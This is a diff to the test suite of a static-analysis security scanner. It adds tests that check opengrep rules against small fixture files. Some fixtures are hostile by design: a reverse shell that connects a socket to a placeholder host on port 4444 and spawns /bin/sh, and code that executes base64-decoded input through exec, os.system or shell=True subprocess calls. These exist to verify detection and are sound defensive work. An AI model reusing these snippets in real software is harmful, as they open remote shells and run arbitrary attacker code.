@@ -48,14 +48,16 @@ def _live_executable():
 def test_frozen_python_contract_has_expected_shape():
     cases = _contract()
     positives = sum(case.vector is not None for case in cases)
-    assert (len(cases), positives, len(cases) - positives) == (258, 129, 129)
+    # A variable key does not sanitize a tainted container; the reviewed contract therefore has
+    # one more positive than the original frozen expectations.
+    assert (len(cases), positives, len(cases) - positives) == (258, 130, 128)
     assert len({case.name for case in cases}) == len(cases)
 
 
 def test_live_opengrep_matches_frozen_python_contract(make_package):
     executable = _live_executable()
     cases = _contract()
-    assert (len(cases), sum(case.vector is not None for case in cases)) == (258, 129)
+    assert (len(cases), sum(case.vector is not None for case in cases)) == (258, 130)
     files = {
         "%03d_%s.py" % (index, case.name.removeprefix("test_")): case.code
         for index, case in enumerate(cases)
@@ -113,6 +115,76 @@ def test_live_lambda_sink_survives_production_coordinator(make_package):
     assert {
         (finding.path, finding.vector) for finding in findings
     } == {("lambda.py", "SXV-008"), ("direct.py", "SXV-008")}
+
+
+def test_live_static_rules_reject_handle_and_non_socket_false_positives(make_package):
+    files = {
+        "gcs_download.py": (
+            "from google.cloud import storage\n"
+            "client = storage.Client()\n"
+            "blob = client.bucket('datasets').blob('model.bin')\n"
+            "blob.download_to_filename('/tmp/model.bin')\n"
+        ),
+        "sqlite_pty.py": (
+            "import pty, sqlite3\n"
+            "conn = sqlite3.connect('app.db')\n"
+            "pty.spawn(['/bin/bash', '-lc', 'make build'])\n"
+        ),
+        "home_listing.py": "from pathlib import Path\nitems = list(Path.home().iterdir())\n",
+        "authorized_keys_write.py": "open('/home/user/.ssh/authorized_keys', 'w').write('key')\n",
+    }
+    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
+
+    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
+
+    assert not [finding for finding in findings if finding.vector in {
+        "SXV-023", "SXV-024", "SXV-025", "SXV-040",
+    }]
+
+
+def test_live_reverse_shell_pty_requires_a_constructed_socket(make_package):
+    code = """\
+import pty
+import socket
+
+sock = socket.socket()
+sock.connect(('example.invalid', 4444))
+pty.spawn('/bin/sh')
+"""
+    parsed = parse.parse_package(ingest.build_package(str(make_package({"reverse.py": code}))))
+
+    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
+
+    assert [(finding.path, finding.vector) for finding in findings if finding.vector == "SXV-040"] \
+        == [("reverse.py", "SXV-040")]
+
+
+def test_live_decoded_payload_sink_parity(make_package):
+    files = {
+        "builtins_exec.py": (
+            "import base64, builtins\n"
+            "builtins.exec(base64.b64decode(input()))\n"
+        ),
+        "kwargs.py": (
+            "import base64, subprocess\n"
+            "subprocess.run(base64.b64decode(input()), **{'shell': True})\n"
+        ),
+        "alias.py": (
+            "import base64, os\n"
+            "launch = os.system\nlaunch(base64.b64decode(input()))\n"
+        ),
+        "shadowed_alias.py": (
+            "import base64, os\n"
+            "launch = os.system\nlaunch = lambda value: value\n"
+            "launch(base64.b64decode(input()))\n"
+        ),
+    }
+    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
+
+    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
+    paths = {finding.path for finding in findings if finding.vector == "SXV-019"}
+
+    assert paths == {"alias.py", "builtins_exec.py", "kwargs.py"}
 
 
 def test_live_opengrep_keeps_four_incomplete_analysis_contracts_visible(make_package):
